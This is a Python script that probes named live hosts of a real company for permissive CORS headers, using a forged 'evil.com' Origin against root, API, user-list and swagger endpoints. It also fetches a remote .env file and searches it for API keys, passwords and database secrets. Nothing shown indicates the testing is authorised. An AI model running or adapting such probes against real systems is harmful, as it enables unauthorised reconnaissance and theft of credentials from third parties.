import httpx
import sys

sys.stdout.reconfigure(encoding='utf-8')
client = httpx.Client(verify=False, timeout=10.0, follow_redirects=True)

print("=== LIVE CORS VERIFICATION ON qms.lmg.motion.abb.com.cn ===")
try:
    r = client.get(
        "https://qms.lmg.motion.abb.com.cn/",
        headers={"Origin": "https://evil.com"}
    )
    acao = r.headers.get("access-control-allow-origin", "NOT PRESENT")
    acac = r.headers.get("access-control-allow-credentials", "NOT PRESENT")
    ct = r.headers.get("content-type", "")
    print(f"Status: {r.status_code}")
    print(f"ACAO Header: {acao}")
    print(f"ACAC Header: {acac}")
    print(f"Content-Type: {ct}")
    print(f"Content Length: {len(r.content)}")
    print(f"Body Preview: {r.text[:300]}")
except Exception as e:
    print(f"ERROR: {e}")

print()
print("=== CORS ON API ENDPOINTS (qms) ===")
endpoints = [
    "https://qms.lmg.motion.abb.com.cn/api/",
    "https://qms.lmg.motion.abb.com.cn/api/v1/",
    "https://qms.lmg.motion.abb.com.cn/api/users",
    "https://qms.lmg.motion.abb.com.cn/health",
    "https://qms.lmg.motion.abb.com.cn/swagger.json",
    "https://qms.lmg.motion.abb.com.cn/api-docs",
]
for ep in endpoints:
    try:
        r = client.get(ep, headers={"Origin": "https://evil.com"})
        acao = r.headers.get("access-control-allow-origin", "NOT PRESENT")
        print(f"{ep}")
        print(f"  -> Status: {r.status_code} | ACAO: {acao} | Length: {len(r.content)}")
        if r.status_code == 200 and acao != "NOT PRESENT":
            print(f"  -> Body: {r.text[:150]}")
    except Exception as e:
        print(f"{ep} -> ERROR: {e}")

print()
print("=== ALSO CHECK remotemonitoring.drives.abb.com/.env ===")
try:
    r = client.get("https://remotemonitoring.drives.abb.com/.env")
    print(f"Status: {r.status_code}")
    print(f"Content-Type: {r.headers.get('content-type', '')}")
    print(f"Content Length: {len(r.content)}")
    print(f"Body Preview: {r.text[:500]}")
    if "API_KEY" in r.text or "SECRET" in r.text or "PASSWORD" in r.text or "DB_" in r.text:
        print("[!!! CRITICAL] Contains actual secrets/credentials!")
    else:
        print("[INFO] No obvious credentials in content")
except Exception as e:
    print(f"ERROR: {e}")
